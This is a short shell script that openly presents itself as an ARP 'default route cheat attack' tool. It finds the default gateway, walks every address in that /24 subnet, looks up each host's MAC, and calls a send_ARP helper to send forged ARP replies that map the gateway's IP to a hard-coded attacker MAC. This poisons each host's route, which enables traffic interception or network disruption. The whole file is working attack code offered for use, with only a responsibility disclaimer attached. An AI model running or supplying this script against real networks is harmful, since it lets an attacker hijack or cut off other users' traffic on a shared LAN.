#!/bin/sh
#
# Simple default route cheat attack via ARP
# Take Your Own Responsibility !!!
# suggestion please mail to dev.guofeng@gmail.com
#

ARP_send_proc="./send_ARP"
cheat_hw="00:26:22:bc:c6:f2"
current_ip=""
current_mac=""
current_entry=""


if [ ! -x "$ARP_send_proc" ]
then
	echo "cannot find \"$ARP_send_proc\""
	exit 1
fi



if [ `id -u` -ne 0 ]
then
	echo "requair root permission"
	exit 1
fi



# fetch default gateway
dfl_route=`route -n | awk ' $1 ~"^0.0.0.0$" && $4 ~"G" { print $2 }'`
test -z "$dfl_route" && { echo "cannot get the default route"; exit 1; }



# get mac to a ip
# $1	--	ip
# return	mac
getmac()
{
	test -z "$1" && return 1
	
	if [ -n "`arp -n $current_ip | grep -e 'no entry' -e 'incomplete' -e '没有记录'`" ]
	then
		#ping -n -c 1 $current_ip  &> /dev/null
		ping -n -c 1 $current_ip 1> /dev/null 2>/dev/null
	fi
	
	current_mac=`arp -n $current_ip | awk '$1 ~"^'$current_ip'$"{ print \$3 }'`

	test `echo $current_mac | awk -F ":" '{print NF}'` -eq 6 && return 0
	return 1
}



# do attack
# $1	--	a subnet without the fouth field, eg. "10.11.99."
attack_net()
{
	local i=1
	
	test -z "$1" && return 1
	
	while [ $i -lt 255 ]
	do
		current_mac=""
		current_ip=${1}$i
		i=$((i+1))
		
		getmac $current_ip
		
		if [ $? -ne 0 ]
		then
			echo "get mac of $current_ip fail, skip"
			continue
		fi
		
		echo "attack $current_ip ($current_mac)"
		
		$ARP_send_proc --fromhw "$cheat_hw" --tohw "$current_mac" \
		--senderip "$current_entry" --senderhw "$cheat_hw" \
		--recvip "$current_ip" --recvhw "$current_mac"
	done
}


for current_entry in $dfl_route
do
	attack_net "`echo $current_entry | awk -F '.' '{printf "%s.%s.%s.", $1, $2, $3}'`"
done

